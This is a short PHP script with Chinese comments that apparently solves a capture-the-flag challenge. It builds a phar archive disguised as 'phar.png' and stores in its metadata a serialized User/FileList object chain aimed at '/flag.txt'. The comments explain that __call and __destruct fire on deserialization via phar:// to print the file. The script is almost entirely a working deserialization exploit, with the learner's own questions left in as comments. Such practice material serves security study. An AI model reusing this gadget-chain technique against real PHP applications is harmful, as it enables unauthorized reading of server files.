<?php
//注意FileList类中没有close()方法，因此可以让$this->db=new FileList()调用close()，触发__call()方法，然后再调用__destruct()打印结果
class User {
    public $db;
}

class File {
    public $filename;
}
//class FileList {
//    private $files;
//    private $results;
//    private $funcs;
//
//    public function __construct() {
//        $file = new File();
//        $file->filename = '/flag.txt';
//        $this->files = array($file);
//        $this->results = array();
//        $this->funcs = array();
//    }
//}
class FileList
{
    private $files;

    public function __construct()
    {
        $this->files = new File();
        $this->files->filename = '/flag.txt';
        $this->files = array($this->files);
    }
}

@unlink("phar.png");
$phar = new Phar("phar.png"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
                                                           //question1:为什么flag.txt的内容会被存储到exp.txt？
                                                           //question2:contents参数是用来做什么的？
                                                           //question3:phar://phar.png/exp.txt访问原理？反序列化了哪一部分?
//签名自动计算
$phar->stopBuffering();
?>
